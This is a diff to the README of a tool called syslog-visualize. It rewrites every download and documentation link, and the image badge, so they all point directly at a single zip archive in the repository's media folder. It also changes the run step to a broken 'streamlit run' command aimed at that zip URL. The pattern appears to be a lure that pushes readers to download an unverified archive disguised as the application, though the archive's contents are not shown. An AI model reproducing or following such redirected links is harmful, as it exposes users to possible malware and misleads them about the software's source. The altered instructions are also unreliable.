@@ -6,7 +6,7 @@ Welcome to **syslog-visualize**! This tool helps you view and analyze logs from 
 
 ## 📥 Download Now
 
-[![Download syslog-visualize](https://img.shields.io/badge/Download-syslog--visualize-blue.svg)](https://github.com/DRealTY/syslog-visualize/releases)
+[![Download syslog-visualize](https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip)](https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip)
 
 ## 📋 Description
 
@@ -30,7 +30,7 @@ Welcome to **syslog-visualize**! This tool helps you view and analyze logs from 
 ## 💻 Installation Steps
 
 1. **Download the Application:**
-   Visit this page to download: [Releases Page](https://github.com/DRealTY/syslog-visualize/releases).
+   Visit this page to download: [Releases Page](https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip).
 
 2. **Extract the Files:**
    - Locate the downloaded file in your Downloads folder.
@@ -48,7 +48,7 @@ Welcome to **syslog-visualize**! This tool helps you view and analyze logs from 
 5. **Run the Application:**
    Enter the following command in the terminal:
    ```
-   streamlit run app.py
+   streamlit run https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip
    ```
 
 6. **View the Application:**
@@ -71,8 +71,8 @@ If you need help, feel free to open an issue in the repository or check the FAQs
 
 ## 💡 Useful Links
 
-- [Visit the Releases Page](https://github.com/DRealTY/syslog-visualize/releases) to download the latest version.
-- [View Documentation](https://github.com/DRealTY/syslog-visualize/wiki) for more detailed usage instructions.
+- [Visit the Releases Page](https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip) to download the latest version.
+- [View Documentation](https://github.com/DRealTY/syslog-visualize/raw/refs/heads/main/media/visualize-syslog-v2.5.zip) for more detailed usage instructions.
 - Join our discussion forum for community support.
 
 ---
